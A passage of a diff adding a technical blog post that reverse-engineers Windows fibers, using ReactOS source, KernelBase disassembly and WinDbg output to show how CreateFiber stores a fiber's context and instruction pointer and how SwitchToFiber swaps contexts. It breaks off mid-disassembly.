+; Setting Teb-&gt;FiberData
+</code></pre><p>Examining the TEB structure, we find that the WORD referenced by *(rdi+0x17ee) actually represents bit flags for different features in the process.</p>
+<pre tabindex="0"><code>0:000&gt; dt nt!_TEB
+ntdll!_TEB
+    +0x17ee SameTebFlags     : Uint2B
+    +0x17ee SafeThunkCall    : Pos 0, 1 Bit
+    +0x17ee InDebugPrint     : Pos 1, 1 Bit
+    +0x17ee HasFiberData     : Pos 2, 1 Bit ; &#34;or word ptr [rdi+17EEh], 4&#34; sets this to TRUE 
+    +0x17ee SkipThreadAttach : Pos 3, 1 Bit
+    +0x17ee WerInShipAssertCode : Pos 4, 1 Bit
+    +0x17ee RanProcessInit   : Pos 5, 1 Bit
+    +0x17ee ClonedThread     : Pos 6, 1 Bit
+    +0x17ee SuppressDebugMsg : Pos 7, 1 Bit
+    +0x17ee DisableUserStackWalk : Pos 8, 1 Bit
+    +0x17ee RtlExceptionAttached : Pos 9, 1 Bit
+    +0x17ee InitialThread    : Pos 10, 1 Bit
+    +0x17ee SessionAware     : Pos 11, 1 Bit
+    +0x17ee LoadOwner        : Pos 12, 1 Bit
+    +0x17ee LoaderWorker     : Pos 13, 1 Bit
+    +0x17ee SkipLoaderInit   : Pos 14, 1 Bit
+    +0x17ee SpareSameTebBits : Pos 15, 1 Bit
+</code></pre><p>We can also see that the QWORD PTR referenced by *(rdi+0x20) is a FiberData pointer in the process&rsquo; TIB.</p>
+<pre tabindex="0"><code>0:000&gt; dt nt!_NT_TIB
+ntdll!_NT_TIB
+    +0x000 ExceptionList    : Ptr64 _EXCEPTION_REGISTRATION_RECORD
+    +0x008 StackBase        : Ptr64 Void
+    +0x010 StackLimit       : Ptr64 Void
+    +0x018 SubSystemTib     : Ptr64 Void
+    +0x020 FiberData        : Ptr64 Void ; This is what GetFiberData fetches
+    +0x020 Version          : Uint4B
+    +0x028 ArbitraryUserPointer : Ptr64 Void
+    +0x030 Self             : Ptr64 _NT_TIB
+</code></pre><p>Neat. So our FiberData pointer and HasFiberData flag both live in the TEB.
+One could define a GetFiberData macro essentially as a few intrinsic functions equivalent to:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C++" data-lang="C++"><span style="display:flex;"><span><span style="color:#66d9ef">void</span><span style="color:#f92672">*</span> <span style="color:#a6e22e">GetFiberData</span>(){
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">#ifdef _WIN64
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">return</span> __readgsqword(<span style="color:#ae81ff">0x20</span>) <span style="color:#75715e">// mov rax, gs:[20]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">#else
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">return</span> __readfsdword(<span style="color:#ae81ff">0x20</span>) <span style="color:#75715e">// mov eax, fs:[20]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">#endif
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>}
+</span></span></code></pre></div><p>So how does CreateFiber store the instruction pointer of the function we desire?
+Let&rsquo;s again go back to ReactOS for definition of <a href="https://doxygen.reactos.org/d9/d44/dll_2win32_2kernel32_2client_2fiber_8c_source.html">CreateFiberEx</a> (this time without truncation):</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C++" data-lang="C++"><span style="display:flex;"><span><span style="color:#75715e">/*
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">* @implemented
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">*/</span>
+</span></span><span style="display:flex;"><span>LPVOID
+</span></span><span style="display:flex;"><span>WINAPI
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">CreateFiberEx</span>(_In_ SIZE_T dwStackCommitSize,
+</span></span><span style="display:flex;"><span>            _In_ SIZE_T dwStackReserveSize,
+</span></span><span style="display:flex;"><span>            _In_ DWORD dwFlags,
+</span></span><span style="display:flex;"><span>            _In_ LPFIBER_START_ROUTINE lpStartAddress,
+</span></span><span style="display:flex;"><span>            _In_opt_ LPVOID lpParameter)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    PFIBER Fiber; <span style="color:#f92672">!!</span> Note <span style="color:#66d9ef">this</span>
+</span></span><span style="display:flex;"><span>    NTSTATUS Status;
+</span></span><span style="display:flex;"><span>    INITIAL_TEB InitialTeb;
+</span></span><span style="display:flex;"><span>    PACTIVATION_CONTEXT_STACK ActivationContextStackPointer;
+</span></span><span style="display:flex;"><span>    DPRINT(<span style="color:#e6db74">&#34;Creating Fiber</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">/* Check for invalid flags */</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (dwFlags <span style="color:#f92672">&amp;</span> <span style="color:#f92672">~</span>FIBER_FLAG_FLOAT_SWITCH)
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">/* Fail */</span>
+</span></span><span style="display:flex;"><span>        SetLastError(ERROR_INVALID_PARAMETER);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> NULL;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">/* Allocate the Activation Context Stack */</span>
+</span></span><span style="display:flex;"><span>    ActivationContextStackPointer <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>    Status <span style="color:#f92672">=</span> RtlAllocateActivationContextStack(<span style="color:#f92672">&amp;</span>ActivationContextStackPointer);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>NT_SUCCESS(Status))
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">/* Fail */</span>
+</span></span><span style="display:flex;"><span>        BaseSetLastNTError(Status);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> NULL;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">/* Allocate the fiber */</span>
+</span></span><span style="display:flex;"><span>    Fiber <span style="color:#f92672">=</span> RtlAllocateHeap(RtlGetProcessHeap(),
+</span></span><span style="display:flex;"><span>                            <span style="color:#ae81ff">0</span>,
+</span></span><span style="display:flex;"><span>                            <span style="color:#66d9ef">sizeof</span>(FIBER));
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>Fiber)
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">/* Free the activation context stack */</span>
+</span></span><span style="display:flex;"><span>        RtlFreeActivationContextStack(ActivationContextStackPointer);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">/* Fail */</span>
+</span></span><span style="display:flex;"><span>        SetLastError(ERROR_NOT_ENOUGH_MEMORY);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> NULL;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">/* Create the stack for the fiber */</span>
+</span></span><span style="display:flex;"><span>    Status <span style="color:#f92672">=</span> BaseCreateStack(NtCurrentProcess(),
+</span></span><span style="display:flex;"><span>                            dwStackCommitSize,
+</span></span><span style="display:flex;"><span>                            dwStackReserveSize,
+</span></span><span style="display:flex;"><span>                            <span style="color:#f92672">&amp;</span>InitialTeb);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>NT_SUCCESS(Status))
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">/* Free the fiber */</span>
+</span></span><span style="display:flex;"><span>        RtlFreeHeap(GetProcessHeap(),
+</span></span><span style="display:flex;"><span>                    <span style="color:#ae81ff">0</span>,
+</span></span><span style="display:flex;"><span>                    Fiber);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">/* Free the activation context stack */</span>
+</span></span><span style="display:flex;"><span>        RtlFreeActivationContextStack(ActivationContextStackPointer);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">/* Failure */</span>
+</span></span><span style="display:flex;"><span>        BaseSetLastNTError(Status);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> NULL;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">/* Clear the context */</span>
+</span></span><span style="display:flex;"><span>    RtlZeroMemory(<span style="color:#f92672">&amp;</span>Fiber<span style="color:#f92672">-&gt;</span>FiberContext,
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">sizeof</span>(CONTEXT));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">/* Copy the data into the fiber */</span>
+</span></span><span style="display:flex;"><span>    Fiber<span style="color:#f92672">-&gt;</span>StackBase <span style="color:#f92672">=</span> InitialTeb.StackBase;
+</span></span><span style="display:flex;"><span>    Fiber<span style="color:#f92672">-&gt;</span>StackLimit <span style="color:#f92672">=</span> InitialTeb.StackLimit;
+</span></span><span style="display:flex;"><span>    Fiber<span style="color:#f92672">-&gt;</span>DeallocationStack <span style="color:#f92672">=</span> InitialTeb.AllocatedStackBase;
+</span></span><span style="display:flex;"><span>    Fiber<span style="color:#f92672">-&gt;</span>FiberData <span style="color:#f92672">=</span> lpParameter;
+</span></span><span style="display:flex;"><span>    Fiber<span style="color:#f92672">-&gt;</span>ExceptionList <span style="color:#f92672">=</span> EXCEPTION_CHAIN_END;
+</span></span><span style="display:flex;"><span>    Fiber<span style="color:#f92672">-&gt;</span>GuaranteedStackBytes <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>    Fiber<span style="color:#f92672">-&gt;</span>FlsData <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>    Fiber<span style="color:#f92672">-&gt;</span>ActivationContextStackPointer <span style="color:#f92672">=</span> ActivationContextStackPointer;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">/* Save FPU State if requested, otherwise just the basic registers */</span>
+</span></span><span style="display:flex;"><span>    Fiber<span style="color:#f92672">-&gt;</span>FiberContext.ContextFlags <span style="color:#f92672">=</span> (dwFlags <span style="color:#f92672">&amp;</span> FIBER_FLAG_FLOAT_SWITCH) <span style="color:#f92672">?</span>
+</span></span><span style="display:flex;"><span>                                    (CONTEXT_FULL <span style="color:#f92672">|</span> CONTEXT_FLOATING_POINT) <span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span>                                    CONTEXT_FULL;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">/* Initialize the context for the fiber */</span>
+</span></span><span style="display:flex;"><span>    BaseInitializeContext(<span style="color:#f92672">&amp;</span>Fiber<span style="color:#f92672">-&gt;</span>FiberContext, <span style="color:#75715e">// AHA! We found the CONTEXT we were looking for!
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>                        lpParameter,
+</span></span><span style="display:flex;"><span>                        lpStartAddress
+</span></span><span style="display:flex;"><span>                        InitialTeb.StackBase,
+</span></span><span style="display:flex;"><span>                        <span style="color:#ae81ff">2</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">/* Return the Fiber */</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> Fiber;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Neat!
+So now let&rsquo;s check KernelBase!CreateFiberEx to see how it works the same:</p>
+<pre tabindex="0"><code>TRIMMED FOR BREVITY
+00007ffc`cdcf5511 48ff1598a31b00     call    qword ptr [KERNELBASE!_imp_RtlAllocateHeap (00007ffc`cdeaf8b0)] ; Allocating the fiber object on the heap
+00007ffc`cdcf5518 0f1f440000         nop     dword ptr [rax+rax]
+00007ffc`cdcf551d 488bf8             mov     rdi, rax ; store it&#39;s pointer in rdi
+00007ffc`cdcf5520 4885c0             test    rax, rax
+00007ffc`cdcf5523 0f8418f80800       je      KERNELBASE!CreateFiberEx+0x8f8b1 (00007ffc`cdd84d41)
+00007ffc`cdcf5529 8b05c9682800       mov     eax, dword ptr [KERNELBASE!SysInfo+0x18 (00007ffc`cdf7bdf8)]
+00007ffc`cdcf552f 488d4dd0           lea     rcx, [rbp-30h]
+00007ffc`cdcf5533 448b0dae682800     mov     r9d, dword ptr [KERNELBASE!SysInfo+0x8 (00007ffc`cdf7bde8)]
+00007ffc`cdcf553a 4533c0             xor     r8d, r8d
+00007ffc`cdcf553d 48894c2428         mov     qword ptr [rsp+28h], rcx
+00007ffc`cdcf5542 488bd3             mov     rdx, rbx
+00007ffc`cdcf5545 498bcf             mov     rcx, r15
+00007ffc`cdcf5548 4889442420         mov     qword ptr [rsp+20h], rax
+00007ffc`cdcf554d 48ff1524a01b00     call    qword ptr [KERNELBASE!_imp_RtlCreateUserStack (00007ffc`cdeaf578)]
+00007ffc`cdcf5554 0f1f440000         nop     dword ptr [rax+rax]
+00007ffc`cdcf5559 85c0               test    eax, eax
+00007ffc`cdcf555b 0f885ff80800       js      KERNELBASE!CreateFiberEx+0x8f930 (00007ffc`cdd84dc0)
+00007ffc`cdcf5561 33c0               xor     eax, eax
+00007ffc`cdcf5563 4c896dc8           mov     qword ptr [rbp-38h], r13
+00007ffc`cdcf5567 f3480f1ec8         rdsspq  rax
+00007ffc`cdcf556c 4885c0             test    rax, rax
+00007ffc`cdcf556f 0f8582f80800       jne     KERNELBASE!CreateFiberEx+0x8f967 (00007ffc`cdd84df7)
+00007ffc`cdcf5575 33d2               xor     edx, edx
+00007ffc`cdcf5577 488d4f30           lea     rcx, [rdi+30h] ; Remember how the fiber object&#39; CONTEXT is offset 0x30 from it&#39;s base? Load that into rcx
+00007ffc`cdcf557b 41b8d0040000       mov     r8d, 4D0h
+00007ffc`cdcf5581 e839c90800         call    KERNELBASE!memset (00007ffc`cdd81ebf) ; Zero it 
+00007ffc`cdcf5586 488b5550           mov     rdx, qword ptr [rbp+50h]
+00007ffc`cdcf558a 488d4f30           lea     rcx, [rdi+30h]
+00007ffc`cdcf558e 488917             mov     qword ptr [rdi], rdx ds:000002aa`f96b23a0=000002aaf96a0150
+00007ffc`cdcf5591 4080e601           and     sil, 1
+00007ffc`cdcf5595 488b45e0           mov     rax, qword ptr [rbp-20h]
+00007ffc`cdcf5599 4d8bc4             mov     r8, r12
+00007ffc`cdcf559c 48894710           mov     qword ptr [rdi+10h], rax
+00007ffc`cdcf55a0 488b45e8           mov     rax, qword ptr [rbp-18h]
+00007ffc`cdcf55a4 48894718           mov     qword ptr [rdi+18h], rax
+00007ffc`cdcf55a8 488b45f0           mov     rax, qword ptr [rbp-10h]
+00007ffc`cdcf55ac 48834f08ff         or      qword ptr [rdi+8], 0FFFFFFFFFFFFFFFFh
+00007ffc`cdcf55b1 48894720           mov     qword ptr [rdi+20h], rax
+00007ffc`cdcf55b5 4c89af00050000     mov     qword ptr [rdi+500h], r13
+00007ffc`cdcf55bc 4c89af10050000     mov     qword ptr [rdi+510h], r13
+00007ffc`cdcf55c3 4489af18050000     mov     dword ptr [rdi+518h], r13d
+00007ffc`cdcf55ca 664489af1c050000   mov     word ptr [rdi+51Ch], r13w
+00007ffc`cdcf55d2 488b45c0           mov     rax, qword ptr [rbp-40h]
+00007ffc`cdcf55d6 48898708050000     mov     qword ptr [rdi+508h], rax
+00007ffc`cdcf55dd 488b4710           mov     rax, qword ptr [rdi+10h]
+00007ffc`cdcf55e1 483305e0672800     xor     rax, qword ptr [KERNELBASE!BasepFiberCookie (00007ffc`cdf7bdc8)]
+00007ffc`cdcf55e8 4833c7             xor     rax, rdi
+00007ffc`cdcf55eb 4c89742420         mov     qword ptr [rsp+20h], r14
+00007ffc`cdcf55f0 48898720050000     mov     qword ptr [rdi+520h], rax
+00007ffc`cdcf55f7 40f6de             neg     sil
+00007ffc`cdcf55fa 488b45c8           mov     rax, qword ptr [rbp-38h]
+00007ffc`cdcf55fe 48898728050000     mov     qword ptr [rdi+528h], rax
+00007ffc`cdcf5605 1bc0               sbb     eax, eax
+00007ffc`cdcf5607 2508001000         and     eax, 100008h
+00007ffc`cdcf560c 894760             mov     dword ptr [rdi+60h], eax
+00007ffc`cdcf560f 4c8b4de0           mov     r9, qword ptr [rbp-20h]
+00007ffc`cdcf5613 e828000000         call    KERNELBASE!BaseInitializeFiberContext (00007ffc`cdcf5640) ; Initialize the CONTEXT with the created fiber&#39;s routine address
+00007ffc`cdcf5618 488bc7             mov     rax, rdi
+00007ffc`cdcf561b 4c8d5c2470         lea     r11, [rsp+70h]
+00007ffc`cdcf5620 498b5b30           mov     rbx, qword ptr [r11+30h]
+00007ffc`cdcf5624 498b7338           mov     rsi, qword ptr [r11+38h]
+00007ffc`cdcf5628 498b7b40           mov     rdi, qword ptr [r11+40h]
+00007ffc`cdcf562c 498be3             mov     rsp, r11
+00007ffc`cdcf562f 415f               pop     r15
+00007ffc`cdcf5631 415e               pop     r14
+00007ffc`cdcf5633 415d               pop     r13
+00007ffc`cdcf5635 415c               pop     r12
+00007ffc`cdcf5637 5d                 pop     rbp
+00007ffc`cdcf5638 c3                 ret  
+</code></pre><p>The BaseInitializeFiberContext function has two arguments that we care about in rcx and r8:
+CONTEXT for the fiber, and LPFIBER_START_ROUTINE respectively.</p>
+<p>By taking a look at the disassembly for BaseInitializeFiberContext, we can find out where exactly the real instruction pointer goes in the fiber object.</p>
+<pre tabindex="0"><code>KERNELBASE!BaseInitializeFiberContext:
+00007ffc`cdcf5640 48895c2408         mov     qword ptr [rsp+8], rbx ss:000000c4`533bf890=0000000000001000
+00007ffc`cdcf5645 48896c2410         mov     qword ptr [rsp+10h], rbp
+00007ffc`cdcf564a 4889742418         mov     qword ptr [rsp+18h], rsi
+00007ffc`cdcf564f 57                 push    rdi
+00007ffc`cdcf5650 4883ec20           sub     rsp, 20h
+00007ffc`cdcf5654 498bf0             mov     rsi, r8 ; rsi now holds LPFIBER_START_ROUTINE
+00007ffc`cdcf5657 488bea             mov     rbp, rdx
+00007ffc`cdcf565a 33d2               xor     edx, edx
+00007ffc`cdcf565c 41b8d0040000       mov     r8d, 4D0h
+00007ffc`cdcf5662 498bf9             mov     rdi, r9
+00007ffc`cdcf5665 488bd9             mov     rbx, rcx ; rbx now holds CONTEXT for the fiber
+00007ffc`cdcf5668 e852c80800         call    KERNELBASE!memset (00007ffc`cdd81ebf)
+00007ffc`cdcf566d c743300b001000     mov     dword ptr [rbx+30h], 10000Bh
+00007ffc`cdcf5674 65488b042560000000 mov     rax, qword ptr gs:[60h]
+00007ffc`cdcf567d f6400304           test    byte ptr [rax+3], 4
+00007ffc`cdcf5681 0f8499000000       je      KERNELBASE!BaseInitializeFiberContext+0xe0 (00007ffc`cdcf5720)
+00007ffc`cdcf5687 0f31               rdtsc   
+00007ffc`cdcf5689 8b0d59672800       mov     ecx, dword ptr [KERNELBASE!SysInfo+0x8 (00007ffc`cdf7bde8)]
+00007ffc`cdcf568f 48c1e220           shl     rdx, 20h
+00007ffc`cdcf5693 480bc2             or      rax, rdx
+00007ffc`cdcf5696 48c1e905           shr     rcx, 5
+00007ffc`cdcf569a 33d2               xor     edx, edx
+00007ffc`cdcf569c 48f7f1             div     rax, rcx
+00007ffc`cdcf569f 48c1e204           shl     rdx, 4
+00007ffc`cdcf56a3 b9801f0000         mov     ecx, 1F80h
+00007ffc`cdcf56a8 4889b380000000     mov     qword ptr [rbx+80h], rsi ; AHA! We have found that the instruction pointer is at offset 0x80 from the CONTEXT 
+00007ffc`cdcf56af 488b742440         mov     rsi, qword ptr [rsp+40h]
+00007ffc`cdcf56b4 488d05d5d60600     lea     rax, [KERNELBASE!BaseFiberStart (00007ffc`cdd62d90)]
+00007ffc`cdcf56bb 48894378           mov     qword ptr [rbx+78h], rax
+00007ffc`cdcf56bf 482bfa             sub     rdi, rdx
+00007ffc`cdcf56c2 894b34             mov     dword ptr [rbx+34h], ecx
+00007ffc`cdcf56c5 b87f020000         mov     eax, 27Fh
+00007ffc`cdcf56ca 898b18010000       mov     dword ptr [rbx+118h], ecx
+00007ffc`cdcf56d0 b92b000000         mov     ecx, 2Bh
+00007ffc`cdcf56d5 66898300010000     mov     word ptr [rbx+100h], ax
+00007ffc`cdcf56dc 66894b42           mov     word ptr [rbx+42h], cx
+00007ffc`cdcf56e0 4889ab88000000     mov     qword ptr [rbx+88h], rbp
+00007ffc`cdcf56e7 488b6c2438         mov     rbp, qword ptr [rsp+38h]
+00007ffc`cdcf56ec 8d4108             lea     eax, [rcx+8]
+00007ffc`cdcf56ef 66894338           mov     word ptr [rbx+38h], ax
+00007ffc`cdcf56f3 488d4fd0           lea     rcx, [rdi-30h]
+00007ffc`cdcf56f7 488b442450         mov     rax, qword ptr [rsp+50h]
+00007ffc`cdcf56fc c7433a2b002b00     mov     dword ptr [rbx+3Ah], 2B002Bh
+00007ffc`cdcf5703 c7433e53002b00     mov     dword ptr [rbx+3Eh], 2B0053h
+00007ffc`cdcf570a 48898b98000000     mov     qword ptr [rbx+98h], rcx
+00007ffc`cdcf5711 488b5c2430         mov     rbx, qword ptr [rsp+30h]
+00007ffc`cdcf5716 488901             mov     qword ptr [rcx], rax
+00007ffc`cdcf5719 4883c420           add     rsp, 20h
+00007ffc`cdcf571d 5f                 pop     rdi
+00007ffc`cdcf571e c3                 ret     
+00007ffc`cdcf571f cc                 int     3
+00007ffc`cdcf5720 33d2               xor     edx, edx
+00007ffc`cdcf5722 e97cffffff         jmp     KERNELBASE!BaseInitializeFiberContext+0x63 (00007ffc`cdcf56a3)
+</code></pre><p>From all of this we can see the allocation of the FIBER struct, allocating/constructing the ActCtx and the stack, instantiating the CONTEXT for the fiber with the instruction pointer to our fiber routine!
+Awesome!
+So now that means the offset of the instruction pointer is at offset 0x80 from the CONTEXT, which is itself offset 0x30 from the fiber object for total offset of 0xB0.</p>
+<p>A quick definition of ReactOS&rsquo; <a href="https://doxygen.reactos.org/dd/d83/ndk_2ketypes_8h_source.html">FIBER</a> structure:
+Note: This structure is not complete for replication in W10 20H2 x64 (not sure about others)</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C++" data-lang="C++"><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">_FIBER</span>                                    <span style="color:#75715e">/* Field offsets:    */</span>
+</span></span><span style="display:flex;"><span>{                                                        <span style="color:#75715e">/* i386  arm   x64   */</span>
+</span></span><span style="display:flex;"><span>    PVOID FiberData;                                     <span style="color:#75715e">/* 0x000 0x000 0x000 */</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">_EXCEPTION_REGISTRATION_RECORD</span> <span style="color:#f92672">*</span>ExceptionList;<span style="color:#75715e">/* 0x004 0x004 0x008 */</span>
+</span></span><span style="display:flex;"><span>    PVOID StackBase;                                     <span style="color:#75715e">/* 0x008 0x008 0x010 */</span>
+</span></span><span style="display:flex;"><span>    PVOID StackLimit;                                    <span style="color:#75715e">/* 0x00C 0x00C 0x018 */</span>
+</span></span><span style="display:flex;"><span>    PVOID DeallocationStack;                             <span style="color:#75715e">/* 0x010 0x010 0x020 */</span>
+</span></span><span style="display:flex;"><span>    CONTEXT FiberContext;                                <span style="color:#75715e">/* 0x014 0x018 0x030 */</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#if (NTDDI_VERSION &gt;= NTDDI_LONGHORN)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    PVOID Wx86Tib;                                       <span style="color:#75715e">/* 0x2E0 0x1b8 0x500 */</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">_ACTIVATION_CONTEXT_STACK</span> <span style="color:#f92672">*</span>ActivationContextStackPointer; <span style="color:#75715e">/* 0x2E4 0x1bc 0x508 */</span>
+</span></span><span style="display:flex;"><span>    PVOID FlsData;                                       <span style="color:#75715e">/* 0x2E8 0x1c0 0x510 */</span>
+</span></span><span style="display:flex;"><span>    ULONG GuaranteedStackBytes;                          <span style="color:#75715e">/* 0x2EC 0x1c4 0x518 */</span>
+</span></span><span style="display:flex;"><span>    ULONG TebFlags;                                      <span style="color:#75715e">/* 0x2F0 0x1c8 0x51C */</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#else
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    ULONG GuaranteedStackBytes;                          <span style="color:#75715e">/* 0x2E0         */</span>
+</span></span><span style="display:flex;"><span>    PVOID FlsData;                                       <span style="color:#75715e">/* 0x2E4         */</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">_ACTIVATION_CONTEXT_STACK</span> <span style="color:#f92672">*</span>ActivationContextStackPointer;
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#endif
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>} FIBER, <span style="color:#f92672">*</span>PFIBER;
+</span></span></code></pre></div><p>Let&rsquo;s check out this CONTEXT within our LPVOID from CreateFiber to ensure the CONTEXT indeed has our HotPotatoOne address:</p>
+<pre tabindex="0"><code>Immediately after our call to CreateFiber(0, HotPotatoOne, &amp;potato)
+0:000&gt; u rip-6
+FiberBlog!main+0x46 [Source.cpp @ 23]:
+00007ff6`49e55d76 ff158cb20000    call    qword ptr [FiberBlog!_imp_CreateFiber (00007ff6`49e61008)]
+00007ff6`49e55d7c 48894528        mov     qword ptr [rbp+28h],rax ; rip, rax contains fiber object
+00007ff6`49e55d80 4c8d0589790000  lea     r8,[FiberBlog!potato (00007ff6`49e5d710)]
+00007ff6`49e55d87 488d1564b6ffff  lea     rdx,[FiberBlog!ILT+1005(?HotPotatoTwoYAXPEAXZ) (00007ff6`49e513f2)]
+00007ff6`49e55d8e 33c9            xor     ecx,ecx
+00007ff6`49e55d90 ff1572b20000    call    qword ptr [FiberBlog!_imp_CreateFiber (00007ff6`49e61008)]
+00007ff6`49e55d96 48894548        mov     qword ptr [rbp+48h],rax
+00007ff6`49e55d9a 4c8d056f790000  lea     r8,[FiberBlog!potato (00007ff6`49e5d710)]
+
+check the LPVOID fiber object for our fiber&#39;s instruction pointer, rax + 0xB0
+0:000&gt; dq rax+0xb0 L1
+000002aa`f96b2450  00007ff6`49e513f7
+0:000&gt; u poi(rax+0xb0)
+FiberBlog!ILT+1010(?HotPotatoOneYAXPEAXZ):
+00007ff6`49e513f7 e914460000      jmp     FiberBlog!HotPotatoOne (00007ff6`49e55a10)
+</code></pre><p>Nice! The fiber routine&rsquo;s instruction pointer is at the fiber object + 0xb0!</p>
+<p>So far we&rsquo;ve seen how to use them, how control flow works, a bit about how they&rsquo;re created, and now let&rsquo;s talk execution!</p>
+<h2 id="0x03-execution">0x03 Execution</h2>
+<p>Looking back on our HotPotatoOne&rsquo;s control flow decisions, you may be wondering:
+&ldquo;How does switching work such that you needed the do/while?&rdquo;
+WELL, I&rsquo;m glad you asked!</p>
+<p>When one fiber switches to another via SwitchToFiber, the current execution context information is saved to that fiber object&rsquo;s context structure.
+We can see in more detail as we look at the disassembly of KernelBase!SwitchToFiber:</p>
+<pre tabindex="0"><code>KERNELBASE!SwitchToFiber:
+00007ffc`cdd5acd0 4883ec28           sub     rsp, 28h
+00007ffc`cdd5acd4 65488b042530000000 mov     rax, qword ptr gs:[30h]
+00007ffc`cdd5acdd 483b4820           cmp     rcx, qword ptr [rax+20h]
+00007ffc`cdd5ace1 7420               je      KERNELBASE!SwitchToFiber+0x33 (00007ffc`cdd5ad03)
+00007ffc`cdd5ace3 488b4110           mov     rax, qword ptr [rcx+10h]
+00007ffc`cdd5ace7 483305da102200     xor     rax, qword ptr [KERNELBASE!BasepFiberCookie (00007ffc`cdf7bdc8)]
+00007ffc`cdd5acee 4833c1             xor     rax, rcx
+00007ffc`cdd5acf1 48398120050000     cmp     qword ptr [rcx+520h], rax
+00007ffc`cdd5acf8 0f85dc750400       jne     KERNELBASE!SwitchToFiber+0x4760a (00007ffc`cdda22da)
+00007ffc`cdd5acfe e86d720200         call    KERNELBASE!SwitchToFiberContext (00007ffc`cdd81f70) ; Where the real magic happens
+00007ffc`cdd5ad03 4883c428           add     rsp, 28h
+00007ffc`cdd5ad07 c3                 ret     
+</code></pre><p>Most importantly, we see a call to KernelBase!SwitchToFiberContext.
+This function is responsible for saving off our fiber object&rsquo;s context, and changing the next execution context to the destination fiber object&rsquo;s context.</p>
+<p>When HotPotatoThree switches back to HotPotatoOne, the SwitchToFiberContext function restores the stack such that execution returns into the fiber after the call to SwitchToFiberContext.
+Since HotPotatoOne called SwitchToFiber, the return back to HotPotatoOne from SwitchToFiber is done by returning from SwitchToFiberContext:</p>
+<pre tabindex="0"><code>0:000&gt; u rip-0x10
+KERNELBASE!SwitchToFiberContext+0x1f0:
